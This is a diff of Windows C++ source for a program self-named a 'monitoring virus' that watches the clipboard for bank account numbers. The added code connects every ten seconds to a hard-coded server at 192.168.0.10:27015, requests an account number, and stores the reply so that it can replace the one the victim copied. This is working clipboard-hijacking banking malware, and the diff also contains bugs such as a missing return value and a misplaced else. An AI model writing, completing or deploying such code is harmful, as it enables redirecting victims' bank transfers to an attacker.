@@ -1,12 +1,18 @@
-﻿#include <Windows.h>
-#include <time.h>
-#include <WinSock2.h>
+﻿#define WIN32_LEAN_AND_MEAN
 
-#define REQUEST_NUMBER	0xDEAD
-#define POST_NUMBER		0xBEEF
+#include <Windows.h>
+#include <winsock2.h>
+#include <ws2tcpip.h>
+#include <iphlpapi.h>
+#include <stdlib.h>
+#include <time.h>
+#pragma comment(lib, "Ws2_32.lib")
+
 #define MAXL			26
 #define DEFAULT_PORT	"27015"
+#define DEFAULT_ADDR	"192.168.0.10"
 #define DEAFULT_BUFLEN	512
+#define REQUEST_DELAY_S	10.0
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow);
 bool init(HINSTANCE hInstance);
@@ -14,7 +20,8 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
 void MoveToCb();
 bool CheckIfAccountNumber(LPSTR str);
 void CheckForVictim();
-void SaveNumber(LONG_PTR num);
+void GetAccountNumber();
+bool init_winsock();
 
 constexpr CHAR szClassName[] = "WirusMonitorujacy";
 LPSTR bankAccount;
@@ -22,10 +29,16 @@ HWND hwndThis;
 HWND hwndNextViewer;
 time_t start, current;
 bool bAset;
+char sockbuf[DEAFULT_BUFLEN];
+
+SOCKET ConnectSocket;
+struct addrinfo *result = NULL, *ptr = NULL, hints, saClient;
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
 {
 	if (!init(hInstance)) return 1;
+	if (!init_winsock()) return 2;
+	int iSizeofSaClient = sizeof(saClient);
 
 	MSG msg;
 
@@ -33,15 +46,26 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 	{
 		time(&current);
 		double diff = difftime(current, start); // różnica czasu w sekundach
-		if (diff >= 10.0)
+		if (diff >= REQUEST_DELAY_S)
 		{
 			// Wysłanie żądania do procesu nadawcy o konto bankowe
-			// TODO
+			// Connect to server.
+			int iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
+			if (iResult == SOCKET_ERROR) {
+				//freeaddrinfo(result);
+				closesocket(ConnectSocket);
+				ConnectSocket = INVALID_SOCKET;
+			}
+			if (ConnectSocket != INVALID_SOCKET) {
+				GetAccountNumber();
+			}
 			time(&start);
 		}
 		TranslateMessage(&msg);
 		DispatchMessage(&msg);
 	}
+
+	WSACleanup();
 	return 0;
 }
 
@@ -86,18 +110,48 @@ bool init(HINSTANCE hInstance)
 	return true;
 }
 
+bool init_winsock()
+{
+	WSADATA wsadata;
+	int iResult;
+	WORD wersja;
+	wersja = MAKEWORD(2, 2);
+	iResult = WSAStartup(wersja, &wsadata);
+	if (iResult != NO_ERROR)
+		return false;
+
+	ZeroMemory(&hints, sizeof(hints));
+	hints.ai_family = AF_UNSPEC;
+	hints.ai_socktype = SOCK_STREAM;
+	hints.ai_protocol = IPPROTO_TCP;
+
+	// Resolve the server address and port
+	// Remember to set address to the PC that server is on!!!
+	char ac[80];
+	gethostname(ac, sizeof(ac));
+
+	iResult = getaddrinfo(DEFAULT_ADDR, DEFAULT_PORT, &hints, &result);
+	if (iResult != 0) {
+		WSACleanup();
+		return false;
+	}
+	
+	ConnectSocket = INVALID_SOCKET;
+	// Attempt to connect to the first address returned by
+	// the call to getaddrinfo
+	ptr = result;
+	// Create a SOCKET for connecting to server
+	ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
+		ptr->ai_protocol);
+	if (ConnectSocket == INVALID_SOCKET) {
+		freeaddrinfo(result);
+		WSACleanup();
+		return false;
+	}
+}
+
 LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
 {
-	if (msg == messageCode)
-	{
-		switch (wParam)
-		{
-		case POST_NUMBER:
-			SaveNumber(lParam);
-			bAset = true;
-			break;
-		}
-	} else
 	switch (msg)
 	{
 	case WM_CREATE:
@@ -184,7 +238,37 @@ bool CheckIfAccountNumber(LPSTR str)
 	return true;
 }
 
-void SaveNumber(LONG_PTR num)
+void GetAccountNumber()
 {
+	int sockbuflen = DEAFULT_BUFLEN;
+	int iResult;
+	strcpy_s(sockbuf, "Dawaj numer konta!");
 
+	// Send a request for account number
+	iResult = send(ConnectSocket, sockbuf, (int)strlen(sockbuf), 0);
+	if (iResult == SOCKET_ERROR) {
+		closesocket(ConnectSocket);
+		WSACleanup();
+		return;
+	}
+
+	// Shutdown the connection for sending since no more data will be sent
+	// The client can still use the ConnectSocket for receiving data
+	iResult = shutdown(ConnectSocket, SD_SEND);
+	if (iResult == SOCKET_ERROR) {
+		closesocket(ConnectSocket);
+		WSACleanup();
+		return;
+	}
+
+	// Receive data
+	iResult = recv(ConnectSocket, sockbuf, sockbuflen, 0);
+	if (iResult > 0)
+		//strcpy_s(bankAccount, sockbuf);
+		if (CheckIfAccountNumber(sockbuf))
+			memcpy_s(bankAccount, MAXL + 1, sockbuf, strlen(sockbuf));
+	else if (iResult < 0)
+		return;
+	bAset = true;
+	closesocket(ConnectSocket);
 }
